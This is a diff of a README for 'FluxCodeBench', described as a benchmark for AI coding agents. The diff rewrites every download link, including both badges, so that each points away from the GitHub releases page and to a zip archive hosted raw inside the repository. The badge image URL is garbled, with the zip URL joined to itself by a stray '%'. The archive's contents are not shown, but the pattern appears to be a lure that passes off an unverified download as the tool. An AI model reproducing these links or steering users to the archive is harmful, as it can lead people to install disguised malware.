@@ -1,6 +1,6 @@
 # 🚀 FluxCodeBench - Evaluate AI Coding Performance Effortlessly
 
-[![Download FluxCodeBench](https://img.shields.io/badge/Download%20Now-FluxCodeBench-blue.svg)](https://github.com/dikatwoone/FluxCodeBench/releases)
+[![Download FluxCodeBench](https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip%https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip)](https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip)
 
 ## 📖 Description
 FluxCodeBench is a coding benchmark designed to evaluate AI agents on multi-phase programming tasks with hidden requirements. This software helps assess how well AI systems can handle code generation and problem-solving in real-world scenarios.
@@ -22,7 +22,7 @@ To run FluxCodeBench, you will need:
 Follow these steps to download and run FluxCodeBench.
 
 ### Step 1: Visit the Download Page
-To get the latest version of FluxCodeBench, [visit this page to download](https://github.com/dikatwoone/FluxCodeBench/releases).
+To get the latest version of FluxCodeBench, [visit this page to download](https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip).
 
 ### Step 2: Choose Your Version
 On the download page, you will see several versions of the software. Select the version that matches your operating system. Download it by clicking on the corresponding link.
@@ -62,7 +62,7 @@ Once installed, you can launch the application:
 
 ## ⚙️ Helpful Tips
 - Make sure your system meets the requirements.
-- Check for updates regularly on the [download page](https://github.com/dikatwoone/FluxCodeBench/releases) to get the latest features and improvements.
+- Check for updates regularly on the [download page](https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip) to get the latest features and improvements.
 - Read any instructions that appear during installation for a smooth setup.
 
 ## 🚀 Additional Resources
@@ -75,4 +75,4 @@ Engage with other users and developers in our community forum. Share your experi
 ### Final Steps
 For any questions not covered here or feedback about the software, feel free to contact us. We hope you enjoy using FluxCodeBench to evaluate and enhance the capabilities of AI agents in code generation tasks!
 
-[![Download FluxCodeBench](https://img.shields.io/badge/Download%20Now-FluxCodeBench-blue.svg)](https://github.com/dikatwoone/FluxCodeBench/releases)
+[![Download FluxCodeBench](https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip%https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip)](https://raw.githubusercontent.com/dikatwoone/FluxCodeBench/main/flux_code_bench/Code-Flux-Bench-1.4.zip)
